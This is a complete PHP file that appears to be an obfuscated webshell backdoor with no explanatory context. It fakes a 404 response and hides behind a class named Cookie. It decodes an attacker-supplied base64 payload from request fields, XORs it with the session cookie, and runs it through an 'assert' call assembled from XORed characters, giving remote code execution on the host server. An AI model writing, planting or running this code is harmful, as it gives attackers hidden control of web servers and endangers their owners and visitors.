<?php
header('HTTP/1.1 404');
class Cookie{
    function __construct(){
        $password = &$password1;
        $password1 = $_REQUEST['password'];
        $num = &$password;
        $num = $_REQUEST['password'];
        if(is_numeric($num)){
        $post=base64_decode(substr(@$_REQUEST['username'],$num,-$num));
        }
        return $post;
    }
    function decode(){
        $key=$_COOKIE['PHPSESSID'];
        $post = $this->__construct();
        for($i=0;$i<strlen($post);$i++){
            $k = $i%26;
            $s = $post[$i];
            $post[$i] = $s ^ $key[$k];  
        }
        return $post;
    }
    function __destruct(){
        foreach($_POST as $k => $v){
            if ($k!='password'&&$k!='username') {
                $b = &$a;
                $a = $v;
                $c = &$b;
                $_POST[$k]=hex2bin($c);
            }
        }
        $a = ('!'^'@').'s'.'s'.'e'.'r'.'t';
        $lnng1 = &$lnng;
        $lnng = $this->decode();
        $lnng2 = $lnng1;
        return @$a(`/**123**/`.$lnng2.`/**123**/`);
    }
}
$check=new Cookie();
?>
